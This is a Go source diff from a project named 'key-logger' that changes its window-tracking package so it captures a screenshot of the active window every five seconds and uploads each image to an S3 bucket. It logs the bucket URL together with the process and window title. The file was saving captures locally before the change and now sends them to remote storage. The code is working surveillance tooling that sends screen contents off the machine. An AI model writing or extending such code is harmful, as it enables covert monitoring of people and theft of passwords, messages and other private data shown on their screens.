@@ -3,8 +3,7 @@ package window
 import (
 	"fmt"
 	"image"
-	"image/png"
-	"os"
+	"regexp"
 	"sync"
 	"sync/atomic"
 	"syscall"
@@ -15,6 +14,9 @@ import (
 	"github.com/go-kit/kit/log/level"
 	"github.com/gonutz/w32/v2"
 	"github.com/kbinani/screenshot"
+
+	"key-logger/pkg/model"
+	"key-logger/pkg/s3"
 )
 
 var (
@@ -45,11 +47,19 @@ type Window struct {
 	activeProcess    string
 	activeWindowName string
 	bounds           image.Rectangle
+	s3               *s3.S3
+	cleanRegex       *regexp.Regexp
 }
 
-func New(logger log.Logger) *Window {
+func New(logger log.Logger, s3 *s3.S3) *Window {
+	reg, err := regexp.Compile("[^a-zA-Z0-9]+")
+	if err != nil {
+		panic(err)
+	}
 	w := &Window{
-		logger: logger,
+		logger:     logger,
+		s3:         s3,
+		cleanRegex: reg,
 	}
 	setProcessDpiAwarenessContext()
 	go w.updateActiveWindowInfoLoop()
@@ -91,7 +101,6 @@ func (w *Window) updateActiveWindowInfoLoop() {
 		filename := getProcessFileName(ph)
 		w32.CloseHandle(ph)
 		rect := w32.GetWindowRect(handle)
-		fmt.Println(rect)
 		bounds := image.Rect(int(rect.Left), int(rect.Top), int(rect.Right), int(rect.Bottom))
 		w.wmtx.Lock()
 		w.activeProcess = filename
@@ -140,17 +149,22 @@ func (w *Window) logLastInputInfoLoop() {
 			proc := w.activeProcess
 			bounds := w.bounds
 			w.wmtx.Unlock()
-			level.Info(w.logger).Log("ts", time.Now(), "type", "active-window", "window", win, "process", proc)
+			im := &model.Image{}
 			if bounds.Dx() > 0 && bounds.Dy() > 0 {
-				fmt.Println(bounds)
 				img, err := screenshot.CaptureRect(bounds)
 				if err != nil {
 					panic(err)
 				}
-				fileName := fmt.Sprintf("%d_%dx%d.png", time.Now().Unix(), bounds.Dx(), bounds.Dy())
-				save(img, fileName)
+				now := time.Now()
+				im.Location = fmt.Sprintf("caps/%d/%d/%d/%d_%s.jpg", now.Year(), now.Month(), now.Day(), now.Unix(), w.cleanRegex.ReplaceAllString(win, ""))
+				im.Image = img
+				w.s3.Send(im)
 			}
-
+			imageLoc := ""
+			if im.Location != "" {
+				imageLoc = fmt.Sprintf("%s/%s/%s", w.s3.GetEndpoint(), w.s3.GetBucket(), im.Location)
+			}
+			level.Info(w.logger).Log("ts", time.Now(), "type", "active-window", "window", win, "process", proc, "image", imageLoc)
 		}
 		time.Sleep(5 * time.Second)
 	}
@@ -159,10 +173,14 @@ func (w *Window) logLastInputInfoLoop() {
 
 // save *image.RGBA to filePath with PNG format.
 func save(img *image.RGBA, filePath string) {
-	file, err := os.Create(filePath)
-	if err != nil {
-		panic(err)
-	}
-	defer file.Close()
-	png.Encode(file, img)
+
+	//// Make thumbnail
+	//dst := image.NewRGBA(image.Rect(0, 0, 640, 360))
+	//draw.CatmullRom.Scale(dst, dst.Rect, img, img.Bounds(), draw.Over, nil)
+	//tn, err := os.Create("t_" + filePath)
+	//if err != nil {
+	//	panic(err)
+	//}
+	//defer tn.Close()
+	//jpeg.Encode(tn, dst, &EightyFivePercent)
 }
